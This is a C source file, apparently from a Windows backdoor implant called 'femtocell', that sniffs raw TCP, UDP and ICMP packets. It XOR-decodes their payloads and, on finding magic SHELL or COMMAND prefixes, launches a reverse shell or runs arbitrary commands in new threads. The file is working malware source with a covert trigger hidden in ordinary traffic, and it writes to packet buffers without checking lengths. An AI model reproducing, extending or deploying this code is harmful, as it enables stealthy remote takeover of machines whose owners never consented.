#include "femtocell.h"

void compare(int payloadLength, char* data)
{
	if (payloadLength > 6)
	{
		if (strncmp(data, SHELL, 6) == 0)
		{
			char* rip = (char*)data + 6;
#ifdef DEBUG
			printf("%s", data);
#endif
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&rev, rip, 0, NULL);
		}
		else if (strncmp(data, COMMAND, 6) == 0)
		{
			char* cmd = (char*)data + 6;
#ifdef DEBUG
			printf("%s", data);
#endif
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&exec, cmd, 0, NULL);
		}
	}
}


void handleTCP(char* buffer, struct ip_hdr_s* ip_header) 
{
	struct tcp_hdr_s* tcp_header = (struct tcp_hdr_s*)(buffer + BUFFER_OFFSET_L4);
	uint16_t sport = ntohs(tcp_header->th_sport);
	uint16_t flag = (uint16_t)tcp_header->th_flags;
	if (flag >> 3 % 2)
	{
		char* data = (char*)(buffer + BUFFER_OFFSET_TCP_DATA);
		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_TCP;
#ifndef DEBUG
		XORCipher(data, XOR_KEY, payloadLength);
#endif
		data[payloadLength - 1] = '\0';
		compare(payloadLength, data);
	}
}


void handleUDP(char* buffer, struct ip_hdr_s* ip_header) 
{
	struct udp_hdr_s* udp_header = (struct udp_hdr_s*)(buffer + BUFFER_OFFSET_L4);
	uint16_t sport = ntohs(udp_header->source);
	char* data = (char*)(buffer + BUFFER_OFFSET_UDP_DATA);
	int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_UDP;
#ifndef DEBUG
	XORCipher(data, XOR_KEY, payloadLength);
#endif
	data[payloadLength - 1] = '\0';
	compare(payloadLength, data);
}


void handleICMP(char* buffer, struct ip_hdr_s* ip_header) 
{
	struct icmp_hdr_s* icmp_header = (struct icmp_hdr_s*)(buffer + BUFFER_OFFSET_L4);
	uint8_t scode = icmp_header->code;
	uint8_t stype = icmp_header->type;
	if (scode == ICMP_CODE && stype == ICMP_REQ)
	{
		char* data = (char*)(buffer + BUFFER_OFFSET_ICMP_DATA);
		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_ICMP;
#ifndef DEBUG
            XORCipher(data, XOR_KEY, payloadLength);
#endif
		data[payloadLength - 1] = '\0';
		compare(payloadLength, data);
	}
}
